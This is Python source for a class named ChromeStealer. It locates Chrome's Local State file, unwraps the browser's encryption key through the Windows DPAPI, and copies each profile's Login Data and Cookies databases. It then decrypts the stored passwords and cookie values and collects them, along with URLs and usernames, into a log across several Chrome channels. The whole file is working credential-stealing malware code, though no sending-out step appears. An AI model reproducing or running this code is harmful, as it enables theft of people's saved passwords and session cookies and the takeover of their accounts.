import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import re
from shutil import copy2
import hashlib

class ChromeStealer:
    def __init__(self):
        # Initialize pre-built paths with "{CHROME_VERSION}" to replace later
        self.CHROME_PATH = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google" + "\\{CHROME_VERSION}\\User Data")
        self.CHROME_PATH_LOCAL_STATE = os.path.normpath(f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google" + "\\{CHROME_VERSION}\\User Data\\Local State")

        self.log = []
        self.hashes = []

    def getSecretKey(self, chromeVersion):
        try:
            # Replace {CHROME_VERSION} for with parameter to get secret key for the requested chromeVersion (param)
            localStatePath = self.CHROME_PATH_LOCAL_STATE.format(CHROME_VERSION="".join(chromeVersion))

            # Open the Local State file and parse content as json
            with open(localStatePath, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # Read the secretKey from json and decrypt it using win32crypt API
            secretKey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secretKey = secretKey[5:]   # remove suffix
            secretKey = win32crypt.CryptUnprotectData(secretKey, None, None, None, 0)[1]
            return secretKey

        except Exception as e:
            # print ("[ERR] Chrome secretkey cannot be found" + str(e))
            return None

    def decryptPassword(self, ciphertext, secretKey):  
        try:
            # Encrypt a cookie or password from chrome using the secretKey derived by self.getSecretKey()
            initVector = ciphertext[3:15]
            encryptedPassword = ciphertext[15:-16]  # 192bit
            cipher = AES.new(secretKey, AES.MODE_GCM, initVector)
            decryptedPassword = cipher.decrypt(encryptedPassword).decode()
            return decryptedPassword

        except Exception as e:
            # print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check version.")
            return None

    def getLogins(self, chromePath, secretKey):
        #  This detects the default chrome profile + any additional created chrome profile (They have name convention starting with Profile+Counter so foldernames are easy to detect using regex)
        profiles = [element for element in os.listdir(chromePath) if re.search("^Profile*|^Default$", element) is not None]
        profilesData = {"logins": [], "cookies": []}

        for profile in profiles:
            # ------------------------------------------------------------------------------
            # Get path of the Login Data SQLite file
            dbPath = os.path.normpath(f"{chromePath}\\{profile}\\Login Data")
            # Create temporary copy to prevent errors if chrome is currently in use
            copy2(dbPath, "tmpX0000.db")
            conn = sqlite3.connect("tmpX0000.db")
            cur = conn.cursor()
            # Select data using SQL SELECT statement, check for local duplicates and store to json
            cur.execute("SELECT action_url, username_value, password_value FROM logins")
            for res in cur.fetchall():
                url = res[0]
                user = res[1]
                password = res[2]
                if user != "" and password != "":
                    password = self.decryptPassword(res[2], secretKey)
                    loginJson = {"url": url, "user": user, "password": password}

                    loginHash = hashlib.md5(json.dumps(loginJson).encode()).hexdigest()
                    if loginHash not in self.hashes:
                        self.hashes.append(loginHash)
                        profilesData["logins"].append(loginJson)
            # Close connection and remove temporary copy
            cur.close()
            conn.close()
            os.remove("tmpX0000.db")

            # ------------------------------------------------------------------------------
            # Same procedure for cookies using the Cookie Database...
            dbPath = os.path.normpath(f"{chromePath}\\{profile}\\\\Network\\Cookies")
            copy2(dbPath, "tmpX0000.db")
            conn = sqlite3.connect("tmpX0000.db")
            cur = conn.cursor()
            cur.execute("SELECT name, value, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, samesite FROM cookies")
            for res in cur.fetchall():
                name = res[0]
                value = res[1]
                encryptedValue = res[2]
                domain = res[3]
                path = res[4]
                expiresUtc = res[5]
                isSecure = res[6]
                isHttpOnly = res[7]
                sameSite = res[8]

                if encryptedValue:
                    cookieValue = self.decryptPassword(encryptedValue, secretKey)
                elif value:
                    cookieValue = value
                else:
                    break

                cookieJson = {
                        "name": name, "value": cookieValue, "domain": domain, "path": path, "expiresUtc": expiresUtc,
                        "httpOnly": isHttpOnly, "secure": isSecure, "sameSite": sameSite
                }

                cookieHash = hashlib.md5(json.dumps(cookieJson).encode()).hexdigest()
                if cookieHash not in self.hashes:
                    self.hashes.append(cookieHash)
                    profilesData["cookies"].append(cookieJson)

            cur.close()
            conn.close()
            os.remove("tmpX0000.db")
            # ------------------------------------------------------------------------------
        return profilesData


    def steal(self):
        # Entrypoint of ChromeStealer. Runs all the function for different possibly installed chrome versions
        for chromeVersion in ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']:
            chromePath = self.CHROME_PATH.format(CHROME_VERSION="".join(chromeVersion))
            if os.path.exists(chromePath):
                secretKey = self.getSecretKey(chromeVersion)
                chromeVersionDataDump = self.getLogins(chromePath, secretKey)
                self.log.append({"chromeVersion": chromeVersion, "data": chromeVersionDataDump })

    def getLogs(self):
        data = self.log
        self.log = []
        return data